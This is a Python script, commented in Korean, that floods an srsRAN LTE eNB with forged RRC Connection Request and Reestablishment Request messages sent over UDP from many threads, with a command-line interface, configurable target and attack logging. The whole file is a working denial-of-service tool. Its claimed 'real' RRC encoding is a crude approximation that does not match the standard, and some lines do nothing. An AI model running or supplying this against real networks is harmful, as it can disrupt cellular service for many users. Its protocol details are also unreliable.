#!/usr/bin/env python3
"""
srsRAN eNB RRC Flooding Attack
실제 RRC 메시지 형식을 기반으로 eNB에 flooding 공격 수행
"""

import socket
import threading
import time
import random
import struct
import json
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import argparse

class RRCConnectionRequest:
    """RRC Connection Request 메시지 생성"""
    
    def __init__(self):
        # RRC Connection Request 메시지 구조 (3GPP TS 36.331)
        self.message_type = 0x01  # RRCConnectionRequest
        self.establishment_causes = {
            'emergency': 0,
            'highPriorityAccess': 1,
            'mt-Access': 2,
            'mo-Signalling': 3,
            'mo-Data': 4,
            'mo-ExceptionData': 5,
            'delayTolerantAccess-v1020': 6,
            'spare1': 7
        }
    
    def generate_message(self, ue_id=None, establishment_cause='mo-Data'):
        """RRC Connection Request 메시지 생성"""
        if ue_id is None:
            # Random UE ID 생성 (40-bit)
            ue_id = random.randint(0, (1 << 40) - 1)
        
        # 메시지 구조 (ASN.1 PER 인코딩 기반)
        # 실제 srsRAN에서 사용하는 형식에 맞춤
        message = bytearray()
        
        # RRC Message Type (1 byte)
        message.append(self.message_type)
        
        # UE Identity (5 bytes - 40 bits)
        message.extend(struct.pack('>Q', ue_id)[3:8])  # 상위 5바이트
        
        # Establishment Cause (3 bits)
        cause_value = self.establishment_causes.get(establishment_cause, 4)
        message.append(cause_value)
        
        # Spare bits (5 bits) - 0으로 채움
        message[-1] |= 0x00  # 마지막 바이트의 하위 5비트는 0
        
        return bytes(message)
    
    def generate_random_message(self):
        """랜덤 파라미터로 RRC Connection Request 생성"""
        ue_id = random.randint(0, (1 << 40) - 1)
        cause = random.choice(list(self.establishment_causes.keys()))
        return self.generate_message(ue_id, cause)

class RRCConnectionReestablishmentRequest:
    """RRC Connection Reestablishment Request 메시지 생성"""
    
    def __init__(self):
        self.message_type = 0x02  # RRCConnectionReestablishmentRequest
    
    def generate_message(self, c_rnti=None, pci=None, short_mac_i=None):
        """RRC Connection Reestablishment Request 메시지 생성"""
        if c_rnti is None:
            c_rnti = random.randint(1, 65535)  # 16-bit C-RNTI
        if pci is None:
            pci = random.randint(0, 503)  # Physical Cell ID
        if short_mac_i is None:
            short_mac_i = random.randint(0, (1 << 16) - 1)  # 16-bit ShortMAC-I
        
        message = bytearray()
        
        # RRC Message Type
        message.append(self.message_type)
        
        # C-RNTI (2 bytes)
        message.extend(struct.pack('>H', c_rnti))
        
        # PCI (2 bytes)
        message.extend(struct.pack('>H', pci))
        
        # ShortMAC-I (2 bytes)
        message.extend(struct.pack('>H', short_mac_i))
        
        return bytes(message)

class RRCFloodingAttack:
    """RRC Flooding Attack 메인 클래스"""
    
    def __init__(self, enb_ip='127.0.0.1', enb_port=2000):
        self.enb_ip = enb_ip
        self.enb_port = enb_port
        self.rrc_conn_req = RRCConnectionRequest()
        self.rrc_reest_req = RRCConnectionReestablishmentRequest()
        self.stats = {
            'messages_sent': 0,
            'errors': 0,
            'start_time': None,
            'end_time': None
        }
        self.running = False
        self.log_dir = "logs"
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)
    
    def send_rrc_message(self, message, thread_id=0):
        """RRC 메시지 전송"""
        try:
            # UDP 소켓 생성 (srsRAN은 UDP 사용)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1.0)
            
            # 메시지 전송
            sock.sendto(message, (self.enb_ip, self.enb_port))
            sock.close()
            
            self.stats['messages_sent'] += 1
            return True
            
        except Exception as e:
            self.stats['errors'] += 1
            print(f"[Thread {thread_id}] 전송 오류: {e}")
            return False
    
    def flooding_worker(self, thread_id, duration, message_type='connection_request'):
        """Flooding 작업자 스레드"""
        start_time = time.time()
        messages_sent = 0
        
        print(f"[Thread {thread_id}] Flooding 시작 - {message_type}")
        
        while self.running and (time.time() - start_time) < duration:
            try:
                if message_type == 'connection_request':
                    message = self.rrc_conn_req.generate_random_message()
                elif message_type == 'reestablishment_request':
                    message = self.rrc_reest_req.generate_message()
                else:
                    message = self.rrc_conn_req.generate_random_message()
                
                if self.send_rrc_message(message, thread_id):
                    messages_sent += 1
                
                # 전송 간격 (밀리초)
                time.sleep(0.001)  # 1ms 간격
                
            except Exception as e:
                print(f"[Thread {thread_id}] 오류: {e}")
                break
        
        print(f"[Thread {thread_id}] 완료 - {messages_sent}개 메시지 전송")
        return messages_sent
    
    def start_flooding(self, num_threads=10, duration=60, message_type='connection_request'):
        """Flooding 공격 시작"""
        print(f"=== RRC Flooding Attack 시작 ===")
        print(f"대상: {self.enb_ip}:{self.enb_port}")
        print(f"스레드 수: {num_threads}")
        print(f"지속 시간: {duration}초")
        print(f"메시지 타입: {message_type}")
        print("=" * 50)
        
        self.running = True
        self.stats['start_time'] = datetime.now()
        
        # 멀티스레딩으로 동시 전송
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = []
            
            for i in range(num_threads):
                future = executor.submit(
                    self.flooding_worker, 
                    i, 
                    duration, 
                    message_type
                )
                futures.append(future)
            
            # 모든 스레드 완료 대기
            total_messages = 0
            for future in futures:
                try:
                    messages = future.result()
                    total_messages += messages
                except Exception as e:
                    print(f"스레드 오류: {e}")
        
        self.running = False
        self.stats['end_time'] = datetime.now()
        
        # 결과 출력
        self.print_statistics(total_messages, duration)
        
        # 로그 저장
        self.save_logs(total_messages, duration, message_type)
    
    def print_statistics(self, total_messages, duration):
        """통계 출력"""
        print(f"\n=== Flooding Attack 결과 ===")
        print(f"총 전송 메시지: {total_messages}")
        print(f"평균 전송 속도: {total_messages/duration:.2f} msg/sec")
        print(f"오류 수: {self.stats['errors']}")
        print(f"시작 시간: {self.stats['start_time']}")
        print(f"종료 시간: {self.stats['end_time']}")
        print("=" * 30)
    
    def save_logs(self, total_messages, duration, message_type):
        """로그 저장"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_file = f"{self.log_dir}/flooding_attack_{timestamp}.json"
        
        log_data = {
            'attack_info': {
                'target_ip': self.enb_ip,
                'target_port': self.enb_port,
                'message_type': message_type,
                'num_threads': 10,  # 기본값
                'duration': duration
            },
            'results': {
                'total_messages': total_messages,
                'messages_per_second': total_messages/duration,
                'errors': self.stats['errors'],
                'start_time': self.stats['start_time'].isoformat(),
                'end_time': self.stats['end_time'].isoformat()
            }
        }
        
        with open(log_file, 'w', encoding='utf-8') as f:
            json.dump(log_data, f, indent=2, ensure_ascii=False)
        
        print(f"로그 저장: {log_file}")
    
    def generate_sample_messages(self):
        """샘플 메시지 생성 및 저장"""
        print("=== 샘플 RRC 메시지 생성 ===")
        
        samples = []
        
        # RRC Connection Request 샘플들
        for i in range(5):
            message = self.rrc_conn_req.generate_random_message()
            samples.append({
                'type': 'RRCConnectionRequest',
                'hex': message.hex(),
                'size': len(message)
            })
        
        # RRC Reestablishment Request 샘플들
        for i in range(3):
            message = self.rrc_reest_req.generate_message()
            samples.append({
                'type': 'RRCConnectionReestablishmentRequest',
                'hex': message.hex(),
                'size': len(message)
            })
        
        # 샘플 저장
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        sample_file = f"{self.log_dir}/rrc_message_samples_{timestamp}.json"
        
        with open(sample_file, 'w', encoding='utf-8') as f:
            json.dump(samples, f, indent=2, ensure_ascii=False)
        
        print(f"샘플 메시지 저장: {sample_file}")
        
        # 샘플 출력
        for i, sample in enumerate(samples):
            print(f"\n샘플 {i+1}: {sample['type']}")
            print(f"  크기: {sample['size']} bytes")
            print(f"  HEX: {sample['hex']}")

def main():
    parser = argparse.ArgumentParser(description='srsRAN eNB RRC Flooding Attack')
    parser.add_argument('--enb-ip', default='127.0.0.1', help='eNB IP 주소')
    parser.add_argument('--enb-port', type=int, default=2000, help='eNB 포트')
    parser.add_argument('--threads', type=int, default=10, help='동시 스레드 수')
    parser.add_argument('--duration', type=int, default=60, help='공격 지속 시간 (초)')
    parser.add_argument('--message-type', choices=['connection_request', 'reestablishment_request'], 
                       default='connection_request', help='메시지 타입')
    parser.add_argument('--generate-samples', action='store_true', help='샘플 메시지 생성')
    
    args = parser.parse_args()
    
    # Flooding Attack 객체 생성
    attack = RRCFloodingAttack(args.enb_ip, args.enb_port)
    
    if args.generate_samples:
        # 샘플 메시지 생성
        attack.generate_sample_messages()
    else:
        # Flooding 공격 실행
        try:
            attack.start_flooding(
                num_threads=args.threads,
                duration=args.duration,
                message_type=args.message_type
            )
        except KeyboardInterrupt:
            print("\n공격이 중단되었습니다.")
            attack.running = False

if __name__ == "__main__":
    main()
